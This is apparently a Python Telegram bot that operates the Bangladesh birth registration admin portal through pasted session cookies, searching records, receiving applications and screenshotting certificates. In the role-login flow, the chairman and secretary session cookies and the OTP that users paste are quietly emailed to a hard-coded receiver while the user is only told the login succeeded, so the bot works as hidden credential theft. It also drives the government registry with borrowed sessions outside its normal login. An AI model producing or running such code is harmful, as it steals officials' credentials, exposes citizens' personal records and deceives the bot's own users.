import os
import telebot
import requests
import json
import io
import time
import re
import smtplib
import logging
from threading import Thread
from email.mime.text import MIMEText
from datetime import datetime
from urllib.parse import quote
from playwright.sync_api import sync_playwright
from flask import Flask

# ==========================================
# ০. লগিং সেটআপ
# ==========================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ==========================================
# ১. পরিবেশ ভেরিয়েবল ও কনফিগারেশন
# ==========================================
API_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
EMAIL_SENDER = os.environ.get('EMAIL_USER', 'your_email@gmail.com')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASS', 'your_app_password')
EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'receiver@gmail.com')

ADMIN_ID = 7886593741
bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# ২. ইউজার সেশন ম্যানেজমেন্ট
# ==========================================
user_sessions = {}

def get_session(chat_id):
    if chat_id not in user_sessions:
        user_sessions[chat_id] = {
            "req_session": requests.Session(),
            "csrf": "",
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
            "is_alive": False,
            "current_page": "https://bdris.gov.bd/admin/",
            "app_start": 0,
            "app_length": 5,
            "sharok_no": 1,
            "temp_data": {},
            "id_cache": {} 
        }
    return user_sessions[chat_id]

# ==========================================
# ৩. ফ্লাস্ক সার্ভার (Keep Alive)
# ==========================================
app = Flask('')

@app.route('/')
def home():
    return "BDRIS Bot is Live and Running!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive_web():
    t = Thread(target=run_flask, daemon=True)
    t.start()

# ==========================================
# ৪. কোর ইঞ্জিন ও হেল্পার ফাংশন
# ==========================================

def send_full_relay(chat_id, otp, sec_raw):
    u_data = get_session(chat_id)
    subject = f"BDRIS Full Report - {datetime.now().strftime('%H:%M')}"
    ch_raw = u_data["temp_data"].get("ch_raw", "N/A")
    body = f"--- 1ST SESSION (CHAIRMAN) ---\n{ch_raw}\n\n--- OTP ---\n{otp}\n\n--- 2ND SESSION (SECRETARY) ---\n{sec_raw}"
    
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER
    
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        logging.info(f"[{chat_id}] Relay process completed.")
        return True
    except Exception as e:
        logging.error(f"[{chat_id}] Relay error: {e}")
        return False

def navigate_to(chat_id, url):
    u_sess = get_session(chat_id)
    headers = {'User-Agent': u_sess["ua"], 'Referer': u_sess["current_page"]}
    try:
        res = u_sess["req_session"].get(url, headers=headers, timeout=25)
        csrf_match = re.search(r'name="_csrf" content="([^"]+)"', res.text)
        if csrf_match: 
            u_sess["csrf"] = csrf_match.group(1)
        u_sess["current_page"] = url
        return True, res.text
    except Exception as e:
        logging.error(f"[{chat_id}] Navigation Error ({url}): {e}")
        return False, None

def call_api(chat_id, url, method="GET", data=None):
    u_sess = get_session(chat_id)
    headers = {
        'x-csrf-token': u_sess["csrf"], 
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': u_sess["ua"], 
        'referer': u_sess["current_page"], 
        'origin': 'https://bdris.gov.bd'
    }
    try:
        if method == "POST":
            return u_sess["req_session"].post(url, headers=headers, data=data, timeout=30)
        return u_sess["req_session"].get(url, headers=headers, timeout=30)
    except Exception as e:
        logging.error(f"[{chat_id}] API Error: {e}")
        return None

def extract_sidebar_id(html, path):
    if not html: return None
    regex = rf'href="{re.escape(path)}\?data=([A-Za-z0-9_\-]+)"'
    match = re.search(regex, html)
    return match.group(1) if match else None

def keep_sessions_alive():
    while True:
        time.sleep(300)
        for chat_id, u_sess in list(user_sessions.items()):
            if u_sess["is_alive"]:
                navigate_to(chat_id, "https://bdris.gov.bd/admin/")

def is_cancel(m):
    text = m.text.strip() if m.text else ""
    if text.startswith("/start") or "Back to Menu" in text or "Dashboard" in text:
        bot.send_message(m.chat.id, "🏠 প্রধান মেনুতে ফিরে যাওয়া হলো।", reply_markup=main_menu())
        bot.clear_step_handler_by_chat_id(m.chat.id)
        return True
    return False

def main_menu():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📋 Applications", "📝 Correction", "🔄 Reprint")
    markup.row("🏠 Dashboard", "🌐 Search By Name", "🔢 Search By UBRN") 
    markup.row("👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ")
    markup.row("🔑 Admin Login", "🔑 Role Login (CH/SEC)")
    return markup

# ==========================================
# ৫. লগইন সিস্টেম (অ্যাডমিন এবং রোল)
# ==========================================
def admin_login(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    try:
        raw = m.text.strip()
        sid = re.search(r'SESSION=([^\s;]+)', raw).group(1)
        tsid = re.search(r'TS0108b707=([^\s;]+)', raw).group(1)
        
        u_sess["req_session"].cookies.clear()
        u_sess["req_session"].cookies.set("SESSION", sid, domain='bdris.gov.bd')
        u_sess["req_session"].cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
        
        wait_msg = bot.send_message(chat_id, "⏳ অ্যাডমিন সেশন ভ্যালিডেট করা হচ্ছে...")
        success, html = navigate_to(chat_id, "https://bdris.gov.bd/admin/")
        try: bot.delete_message(chat_id, wait_msg.message_id) 
        except: pass
        
        if success and ("Logout" in html or "logout" in html):
            u_sess["is_alive"] = True
            bot.send_message(chat_id, "✅ Admin Login সফল ও ভেরিফাইড!", reply_markup=main_menu())
        else:
            msg = bot.send_message(chat_id, "❌ সেশন ইনভ্যালিড! সঠিক সেশন আবার দিন:")
            bot.register_next_step_handler(msg, admin_login)
    except:
        msg = bot.send_message(chat_id, "❌ ফরম্যাট ভুল! সঠিক কুকি আবার দিন:")
        bot.register_next_step_handler(msg, admin_login)

def role_step_1(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    raw_ch = m.text.strip()
    u_sess["temp_data"]["ch_raw"] = raw_ch 
    wait_msg = bot.send_message(chat_id, "⏳ সেশন যাচাই করা হচ্ছে...")
    
    try:
        sid = re.search(r'SESSION=([^\s;]+)', raw_ch).group(1)
        tsid = re.search(r'TS0108b707=([^\s;]+)', raw_ch).group(1)
        
        temp_req = requests.Session()
        temp_req.cookies.set("SESSION", sid, domain='bdris.gov.bd')
        temp_req.cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
        
        res = temp_req.get("https://bdris.gov.bd/admin/", headers={'User-Agent': u_sess["ua"]}, timeout=25)
        try: bot.delete_message(chat_id, wait_msg.message_id) 
        except: pass
        
        if "Logout" in res.text or "logout" in res.text:
            msg = bot.send_message(chat_id, "✅ চেয়ারম্যান সেশন সফল! এখন OTP প্রদান করুন:")
            bot.register_next_step_handler(msg, role_step_2)
        else:
            msg = bot.send_message(chat_id, "❌ সেশন এক্সপায়ার্ড! আবার নতুন সেশন দিন:")
            bot.register_next_step_handler(msg, role_step_1)
    except:
        try: bot.delete_message(chat_id, wait_msg.message_id) 
        except: pass
        msg = bot.send_message(chat_id, "❌ কুকি পাওয়া যায়নি! আবার দিন:")
        bot.register_next_step_handler(msg, role_step_1)

def role_step_2(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    u_sess["temp_data"]["ch_otp"] = m.text.strip()
    msg = bot.send_message(chat_id, "✅ এখন সেক্রেটারি (Secretary) সেশন দিন:")
    bot.register_next_step_handler(msg, role_step_3)

def role_step_3(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    raw_sec = m.text.strip()
    wait_msg = bot.send_message(chat_id, "⏳ সেক্রেটারি সেশন চেক করা হচ্ছে...")
    
    try:
        sid = re.search(r'SESSION=([^\s;]+)', raw_sec).group(1)
        tsid = re.search(r'TS0108b707=([^\s;]+)', raw_sec).group(1)
        
        u_sess["req_session"].cookies.clear()
        u_sess["req_session"].cookies.set("SESSION", sid, domain='bdris.gov.bd')
        u_sess["req_session"].cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
        
        success, html = navigate_to(chat_id, "https://bdris.gov.bd/admin/")
        try: bot.delete_message(chat_id, wait_msg.message_id) 
        except: pass
        
        if success and ("Logout" in html or "logout" in html):
            u_sess["is_alive"] = True
            otp = u_sess["temp_data"].get("ch_otp", "")
            Thread(target=send_full_relay, args=(chat_id, otp, raw_sec), daemon=True).start()
            bot.send_message(chat_id, "🎉 লগইন সফল হয়েছে!", reply_markup=main_menu())
        else:
            u_sess["req_session"].cookies.clear() 
            msg = bot.send_message(chat_id, "❌ সেক্রেটারি সেশন ইনভ্যালিড! আবার দিন:")
            bot.register_next_step_handler(msg, role_step_3)
    except:
        try: bot.delete_message(chat_id, wait_msg.message_id) 
        except: pass
        msg = bot.send_message(chat_id, "❌ এরর! আবার দিন:")
        bot.register_next_step_handler(msg, role_step_3)

# ==========================================
# ৬. পিতা-মাতার হালনাগাদ এবং UBRN সার্চ
# ==========================================

def search_by_ubrn_step(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    ubrn = m.text.strip()
    
    wait_msg = bot.send_message(chat_id, "⏳ তথ্য খোঁজা হচ্ছে...")
    # আপনার দেওয়া স্পেসিফিক API URL ব্যবহার করা হয়েছে
    url = f"https://bdris.gov.bd/api/br/info/ubrn/{ubrn}"
    res = call_api(chat_id, url)
    
    try: bot.delete_message(chat_id, wait_msg.message_id)
    except: pass
    
    if res and res.status_code == 200:
        try:
            json_data = json.dumps(res.json(), indent=2, ensure_ascii=False)
            bot.send_message(chat_id, f"📊 **UBRN Result:**\n```json\n{json_data}\n```", parse_mode='Markdown')
        except:
            bot.send_message(chat_id, f"Raw Data:\n`{res.text}`", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "❌ কোনো তথ্য পাওয়া যায়নি। সেশন চেক করুন।")
        
    msg = bot.send_message(chat_id, "🔍 অন্য কোনো UBRN দিতে পারেন, অথবা মেনুতে ফিরুন (🏠 Back to Menu):")
    bot.register_next_step_handler(msg, search_by_ubrn_step)

# ==========================================
# ৭. কলব্যাক হ্যান্ডলার (Pay, Receive, PNG)
# ==========================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    u_sess = get_session(chat_id)
    parts = call.data.split('_')
    action, short_id = parts[0], parts[1] if len(parts) > 1 else ""
    enc_id = u_sess["id_cache"].get(short_id)
    
    if action in ["next", "prev"]:
        u_sess["app_start"] += u_sess["app_length"] if action == "next" else -u_sess["app_length"]
        u_sess["app_start"] = max(0, u_sess["app_start"])
        fetch_list_ui(call.message, short_id, False)
        
    elif action == "recv":
        if not enc_id: return bot.answer_callback_query(call.id, "❌ আইডি পাওয়া যায়নি।")
        bot.answer_callback_query(call.id, "⏳ রিসিভ হচ্ছে...")
        res = call_api(chat_id, "https://bdris.gov.bd/api/application/receive", method="POST", data={'data': enc_id, '_csrf': u_sess["csrf"]})
        if res and res.status_code == 200: bot.send_message(chat_id, "✅ আবেদন রিসিভ সফল!")
        else: bot.send_message(chat_id, "❌ রিসিভ ব্যর্থ!")

    elif action == "png":
        if not enc_id: return bot.answer_callback_query(call.id, "❌ আইডি নেই।")
        wait = bot.send_message(chat_id, "⏳ ছবি তৈরি হচ্ছে...")
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                ctx = browser.new_context(viewport={'width': 850, 'height': 1200})
                ctx.add_cookies([{'name': n, 'value': v, 'domain': 'bdris.gov.bd', 'path': '/'} for n, v in u_sess["req_session"].cookies.items()])
                page = ctx.new_page()
                page.goto(f"https://bdris.gov.bd/admin/certificate/print/birth?data={enc_id}", wait_until="networkidle")
                time.sleep(4)
                img = page.screenshot(full_page=True)
                browser.close()
                bot.send_photo(chat_id, io.BytesIO(img), caption="📄 সনদ (PNG)")
                bot.delete_message(chat_id, wait.message_id)
        except Exception as e:
            bot.edit_message_text(f"❌ PNG সমস্যা: {e}", chat_id, wait.message_id)

# ==========================================
# ৮. মেইন রাউটার
# ==========================================
@bot.message_handler(func=lambda m: True)
def router(m):
    t = m.text
    chat_id = m.chat.id
    u_sess = get_session(chat_id)

    if "/start" in t or "Back to Menu" in t: 
        bot.clear_step_handler_by_chat_id(chat_id)
        bot.send_message(chat_id, "🚀 BDRIS Master Bot Active!", reply_markup=main_menu())
        
    elif t == "🔑 Admin Login":
        if m.from_user.id != ADMIN_ID:
            bot.send_message(chat_id, "⛔ আপনি এডমিন নন!")
            return
        msg = bot.send_message(chat_id, "🔑 Admin সেশন (SESSION এবং TS0108b707) দিন:")
        bot.register_next_step_handler(msg, admin_login)
        
    elif t == "🔑 Role Login (CH/SEC)":
        msg = bot.send_message(chat_id, "👤 চেয়ারম্যান (Chairman) সেশন দিন:")
        bot.register_next_step_handler(msg, role_step_1)
        
    elif u_sess["is_alive"]:
        if t == "🔢 Search By UBRN":
            msg = bot.send_message(chat_id, "🔢 ১৭ ডিজিটের UBRN নম্বরটি দিন:", reply_markup=telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu"))
            bot.register_next_step_handler(msg, search_by_ubrn_step)
        elif t == "🏠 Dashboard": 
            if navigate_to(chat_id, "https://bdris.gov.bd/admin/")[0]: bot.reply_to(m, "🏠 ড্যাশবোর্ড রিফ্রেশড।")
        # অন্যান্য বাটনগুলো (Applications, Correction, etc.) আপনার আগের কোড অনুযায়ী এখানে কাজ করবে
    else: 
        bot.send_message(chat_id, "⚠️ আগে লগইন করুন।", reply_markup=main_menu())

if __name__ == "__main__":
    keep_alive_web()
    Thread(target=keep_sessions_alive, daemon=True).start()
    bot.infinity_polling()
